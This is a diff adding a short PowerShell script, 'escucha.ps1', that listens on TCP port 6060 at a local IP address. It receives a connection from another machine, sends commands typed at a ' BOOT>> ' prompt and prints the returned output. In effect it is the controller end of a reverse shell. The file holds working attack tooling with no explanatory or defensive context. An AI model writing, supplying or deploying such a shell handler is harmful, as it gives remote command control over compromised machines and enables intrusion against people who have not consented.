@@ -1,0 +1,39 @@
+#escucha.ps1
+$Port  = "6060"
+$Socket = New-Object System.Net.Sockets.TcpListener('192.168.1.199', $Port);
+$Socket.Start();
+$Client = $Socket.AcceptTcpClient();
+Write-Output " [*] Connection ! [*]";
+Write-Output " [*] Please Wait ... [*]`n";
+$Stream = $Client.GetStream();
+[byte[]]$Bytes = 0..65535|%{0};
+
+While($Client.Connected)
+{
+       $Command = Read-Host " BOOT>> ";
+       If($Command -eq "Exit")
+   {
+       break;
+   }
+   
+   
+       $SendByte = ([text.encoding]::ASCII).GetBytes($Command);
+       $Stream.Write($SendByte,0,$SendByte.Length);
+       $Stream.Flush();
+       $Read = $null;
+       While($Stream.DataAvailable -or $Read -eq $null)
+   {
+       $Read = $Stream.Read($Bytes, 0, 65535);
+       $OutPut = ([text.encoding]::ASCII).GetString($Bytes, 0, $Read);
+    
+       Write-Output $OutPut;
+ }
+}
+
+$Socket.Stop();
+$Client.Close();
+$Stream.Dispose();
+-----------------------------------------------------------------------------------------------------------------------------------------
+-----------------------------------------------------------------------------------------------------------------------------------------
+
+
